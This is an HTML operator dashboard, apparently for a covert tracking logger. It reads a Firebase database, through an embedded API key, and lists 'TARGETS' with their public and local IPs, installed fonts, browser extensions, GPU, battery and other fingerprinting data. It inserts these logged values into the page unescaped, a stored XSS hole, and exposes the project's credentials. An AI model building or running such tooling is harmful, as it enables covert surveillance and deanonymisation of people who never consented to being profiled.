<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Console</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background-color: #050505; 
            color: #00ff41; 
            padding: 10px; 
            margin: 0;
            font-size: 13px;
        }
        h1 { 
            border-bottom: 2px solid #00ff41; 
            padding-bottom: 10px; 
            margin-bottom: 15px; 
            font-size: 1.1rem;
        }
        .stat-box { 
            margin-bottom: 15px; border: 1px solid #333; padding: 8px; background: #111;
        }
        
        #log-container { 
            height: 85vh; overflow-y: auto; border: 1px solid #333; background: #000; 
        }

        .log-entry { 
            border-bottom: 1px solid #333; padding: 15px 10px; margin-bottom: 5px;
        }

        .header-line { 
            margin-bottom: 10px; color: #fff; background: #1a1a1a; padding: 8px; 
            border-left: 3px solid #00ff41;
        }
        .timestamp { color: #f60; font-weight: bold; display: block; margin-bottom: 4px; }
        .ip-address { color: #00ff41; font-weight: bold; font-size: 1.1em; }

        .data-row { 
            display: flex; flex-direction: column; margin-bottom: 8px; 
            border-bottom: 1px dashed #222; padding-bottom: 4px;
        }
        .label { color: #666; font-size: 0.8em; text-transform: uppercase; }
        .value { 
            color: #ddd; 
            white-space: pre-wrap; 
            word-break: break-word; 
            font-size: 0.95em;
        }
    </style>
</head>
<body>

    <h1>// GLOBAL_LOGS</h1>
    <div class="stat-box">TARGETS: <span id="visit-count" style="color:#fff">0</span></div>
    <div id="log-container">Initializing...</div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        const firebaseConfig = {
            apiKey: "AIzaSyD19FsJIWCif0h-ExcGODrok4M7wk_bSBc",
            authDomain: "void-81e60.firebaseapp.com",
            databaseURL: "https://void-81e60-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "void-81e60",
            storageBucket: "void-81e60.appspot.com",
            messagingSenderId: "749357378719",
            appId: "1:749357378719:web:6343550759a405e5c1c6aa"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const container = document.getElementById('log-container');
        
        db.ref('engagements').on('value', snap => {
            document.getElementById('visit-count').innerText = snap.val() || 0;
        });

        const formatDate = (isoString) => {
            if (!isoString) return 'Unknown Time';
            const d = new Date(isoString);
            const day = d.getDate();
            const suffix = ["th", "st", "nd", "rd"][(day % 10 > 3 || [11, 12, 13].includes(day % 100)) ? 0 : day % 10];
            const month = d.toLocaleString('en-IN', { month: 'short' });
            const year = d.getFullYear();
            const time = d.toLocaleString('en-IN', { hour: 'numeric', minute: 'numeric', hour12: true, timeZone: "Asia/Kolkata" });
            return `${day}${suffix} ${month}. ${year}, ${time}`;
        };

        db.ref('records').limitToLast(50).on('child_added', (snapshot) => {
            if(container.innerHTML.includes('Initializing')) container.innerHTML = '';

            const data = snapshot.val();
            // In the new logger, data IS the info
            const info = data.fullDeviceInfo || data; 
            
            const entry = document.createElement('div');
            entry.className = 'log-entry';

            const row = (lbl, val) => `
                <div class="data-row">
                    <span class="label">${lbl}</span>
                    <span class="value">${val || 'N/A'}</span>
                </div>`;

            const ipDisplay = info.publicIP || data.ip || 'Unknown IP';

            entry.innerHTML = `
                <div class="header-line">
                    <span class="timestamp">${formatDate(data.timestamp || info.timestamp)}</span> 
                    <span class="ip-address">IP: ${ipDisplay}</span>
                </div>

                ${row('Local IP', info.localIP)}
                ${row('Referrer', info.referrer)}
                ${row('Connection', info.connection)}
                ${row('AdBlocker', info.adBlocker)}
                
                ${row('Device / Browser (Raw)', info.userAgent)}
                ${row('Detected Fonts (OS)', info.osFonts)}
                ${row('Extensions', info.extensions)}
                
                ${row('Platform', info.platform)}
                ${row('GPU', info.gpu)}
                ${row('Storage', info.storage)}
                ${row('CPU / RAM', `${info.cpu} Cores / ${info.ram}`)}
                ${row('Screen', info.screen)}
                ${row('Battery', info.battery)}
            `;

            container.insertBefore(entry, container.firstChild);
        });
    });
    </script>
</body>
</html>
